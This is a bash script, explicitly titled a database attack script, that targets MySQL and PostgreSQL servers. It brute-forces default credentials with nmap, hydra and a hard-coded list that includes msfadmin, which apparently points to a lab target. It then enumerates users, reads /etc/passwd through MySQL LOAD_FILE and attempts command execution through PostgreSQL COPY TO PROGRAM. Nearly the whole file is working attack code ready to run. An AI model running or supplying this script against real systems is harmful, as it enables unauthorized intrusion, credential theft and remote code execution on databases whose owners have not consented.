#!/bin/bash
###############################################################################
# Database Attack Script
# MySQL, PostgreSQL exploitation and credential spraying
###############################################################################

SUBTYPE="${1:-full}"
TARGET_IP="${2:-10.10.40.20}"
TARGET_PORT="${3:-3306}"
RESULTS_DIR="${4:-.}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORDLISTS_DIR="${SCRIPT_DIR}/wordlists"

mkdir -p "$RESULTS_DIR"

echo "[*] Database attacks: $SUBTYPE against ${TARGET_IP}"

run_mysql() {
    echo "[*] MySQL exploitation"

    # Nmap MySQL scripts
    nmap -p 3306 --script=mysql-info,mysql-enum,mysql-databases,mysql-brute \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_mysql.txt" 2>&1 || true

    # Try default credentials
    local creds=("root:" "root:root" "root:password" "root:mysql" "root:toor"
                 "admin:admin" "mysql:mysql" "msfadmin:msfadmin" "test:test")

    for cred in "${creds[@]}"; do
        user="${cred%%:*}"
        pass="${cred#*:}"
        echo "[*] Trying MySQL: ${user}/${pass}"
        mysql -h "$TARGET_IP" -u "$user" -p"$pass" -e "SELECT version(); SHOW DATABASES;" \
            >> "${RESULTS_DIR}/mysql_access.txt" 2>&1 || true
        sleep 0.5
    done

    # If default creds work, try data extraction
    echo "[*] Attempting MySQL data extraction..."
    mysql -h "$TARGET_IP" -u "msfadmin" -p"msfadmin" -e "
        SELECT version();
        SHOW DATABASES;
        SELECT user,host FROM mysql.user;
        SHOW VARIABLES LIKE '%secure%';
    " >> "${RESULTS_DIR}/mysql_enum.txt" 2>&1 || true

    # Try LOAD_FILE
    mysql -h "$TARGET_IP" -u "msfadmin" -p"msfadmin" -e "
        SELECT LOAD_FILE('/etc/passwd');
    " >> "${RESULTS_DIR}/mysql_loadfile.txt" 2>&1 || true

    echo "[+] MySQL exploitation complete"
}

run_postgres() {
    echo "[*] PostgreSQL exploitation"

    # Nmap PostgreSQL scripts
    nmap -p 5432 --script=pgsql-brute \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_postgres.txt" 2>&1 || true

    # Try default credentials
    local creds=("postgres:postgres" "postgres:password" "postgres:" "msfadmin:msfadmin"
                 "admin:admin" "test:test")

    for cred in "${creds[@]}"; do
        user="${cred%%:*}"
        pass="${cred#*:}"
        echo "[*] Trying PostgreSQL: ${user}/${pass}"
        PGPASSWORD="$pass" psql -h "$TARGET_IP" -U "$user" -c "SELECT version();" \
            >> "${RESULTS_DIR}/postgres_access.txt" 2>&1 || true
        sleep 0.5
    done

    # If default creds work, try system commands
    echo "[*] Attempting PostgreSQL command execution..."
    PGPASSWORD="postgres" psql -h "$TARGET_IP" -U "postgres" -c "
        SELECT version();
        SELECT current_database();
        SELECT datname FROM pg_database;
        SELECT usename FROM pg_user;
    " >> "${RESULTS_DIR}/postgres_enum.txt" 2>&1 || true

    # Try COPY FROM PROGRAM
    PGPASSWORD="postgres" psql -h "$TARGET_IP" -U "postgres" -c "
        COPY (SELECT 1) TO PROGRAM 'id';
    " >> "${RESULTS_DIR}/postgres_rce.txt" 2>&1 || true

    echo "[+] PostgreSQL exploitation complete"
}

run_credential_spray() {
    echo "[*] Database credential spray"

    # Hydra MySQL
    echo "[*] Spraying MySQL credentials..."
    hydra -L "${WORDLISTS_DIR}/small_users.txt" \
          -P "${WORDLISTS_DIR}/small_passwords.txt" \
          -t 4 -f \
          "${TARGET_IP}" mysql 2>&1 | tee "${RESULTS_DIR}/mysql_spray.txt" || true
    sleep 5

    # Hydra PostgreSQL
    echo "[*] Spraying PostgreSQL credentials..."
    hydra -L "${WORDLISTS_DIR}/small_users.txt" \
          -P "${WORDLISTS_DIR}/small_passwords.txt" \
          -t 4 -f \
          "${TARGET_IP}" postgres 2>&1 | tee "${RESULTS_DIR}/postgres_spray.txt" || true

    echo "[+] Credential spray complete"
}

case "$SUBTYPE" in
    mysql)              run_mysql ;;
    postgres)           run_postgres ;;
    credential_spray)   run_credential_spray ;;
    full)
        run_mysql
        sleep 5
        run_postgres
        sleep 5
        run_credential_spray
        ;;
    *)
        echo "Unknown subtype: $SUBTYPE"
        echo "Available: mysql, postgres, credential_spray, full"
        exit 1
        ;;
esac

echo "[*] Database attack script complete"
